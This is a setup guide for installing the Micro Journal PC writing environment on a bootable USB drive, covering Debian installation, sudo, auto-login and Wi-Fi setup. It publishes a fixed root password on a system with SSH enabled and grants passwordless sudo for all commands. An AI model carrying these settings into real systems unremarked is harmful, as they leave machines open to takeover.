# **Micro Journal PC Image Setup Guide**

This guide explains how to install and run the **Micro Journal PC Edition** from a USB drive.
It shares the same configuration as the Raspberry Pi version, but this document covers only the **PC-specific steps**.

For all general setup and application configuration, refer to the Raspberry Pi version (Rev.2 guide).

---

# **1. Installation Concept**

Micro Journal PC runs entirely from a **USB thumb drive**.
You plug it into any computer, boot from USB, and immediately enter a focused writing environment with all software preconfigured.

**Benefits:**

* **No changes to the host computer**
* Easily portable. Carry your writing environment anywhere
* No need for a hard drive installation
* Safe: isolated from the main system

**You will need:**

* **Two USB drives** (each at least 4GB)
* One for Debian installer
* One that becomes the Micro Journal PC
* A computer capable of USB booting

You will first create a Debian installation disk, then install Debian onto the second USB drive.

---

# **2. Using the Prebuilt Image (Recommended)**

This is the **fastest** and simplest method.

1. Download the prebuilt image from the Releases page:
   [https://github.com/unkyulee/micro-journal-linux/releases](https://github.com/unkyulee/micro-journal-linux/releases)

2. Flash the image using **[USBImager](https://github.com/unkyulee/micro-journal-linux/raw/refs/heads/main/imageusb.zip)** (required!).
   ❗ *Tools like Rufus or BalenaEtcher will not work for this image* because the flashing must occur at the **device level**.

3. Boot your PC from the flashed drive.

You're done.
No need to follow the remaining installation instructions.

---

# **3. Create a Debian Installation USB**

If you want to manually build the system, follow this method.

### **1. Download Debian Installer (Netinst)**

[https://www.debian.org/CD/netinst/](https://www.debian.org/CD/netinst/)

### **2. Flash it to a USB**

Use **Rufus** or **BalenaEtcher**.

### **3. Boot from the installer USB**

During installation:

* Install **no desktop environment**
* Select:

  * ✔ Standard System Utilities
  * ✔ SSH Server
  * ✘ Desktop Environment

This keeps the system lightweight.

---

# **4. First Boot – Install Essential Packages**

After installation, boot the system from the **target USB** (the future Micro Journal PC).

It will not have Wi-Fi initially, so it’s easiest if **the PC is connected with Ethernet** for this step.

### **Login as root**

Password: `microjournal`

Run updates:

```bash
apt update
apt upgrade
```

---

# **5. Add `microjournal` User to Sudoers (No Password)**

Install sudo:

```bash
apt install sudo
```

Add the user to sudo group:

```bash
usermod -aG sudo microjournal
```

Edit sudoers:

```bash
visudo
```

Add:

```
microjournal ALL=(ALL) NOPASSWD: ALL
```

This allows all sudo commands without password prompts.

---

# **6. Install Network Manager**

```bash
apt install network-manager
```

Check IP address (for SSH):

```bash
ip addr
```

After this, you can set up Wi-Fi and continue the remaining steps via **SSH**.

---

# **7. Enable Auto-Login**

Auto-login ensures Micro Journal starts immediately on boot.

Create override file:

```bash
sudo mkdir -p /etc/systemd/system/getty@tty1.service.d
sudo nano /etc/systemd/system/getty@tty1.service.d/override.conf
```

Add:

```
[Service]
ExecStart=
ExecStart=-/sbin/agetty --autologin microjournal --noclear %I $TERM
```

Apply changes:

```bash
sudo systemctl daemon-reload
sudo systemctl restart getty@tty1
sudo reboot
```

---

# **8. Configure Micro Journal PC Environment**

At this point, SSH into the system as `microjournal`.

Follow the same configuration steps used for the Raspberry Pi version:

* App setup
* Keybindings
* Scripts
* Micro + WordGrinder configuration
* Language input (optional)
* Terminal environment

Refer to **Rev.2 Guide (`readme.md`)**.

---

# **9. Wi-Fi Manager Script**

You can optionally create a simple Wi-Fi management script.

### **Create Script**

```bash
nano ~/microjournal/wifi.sh
```

Add:

```bash
sudo nmtui
```

### **Make Executable**

```bash
chmod +x ~/microjournal/wifi.sh
```

Run:

```bash
~/microjournal/wifi.sh
```
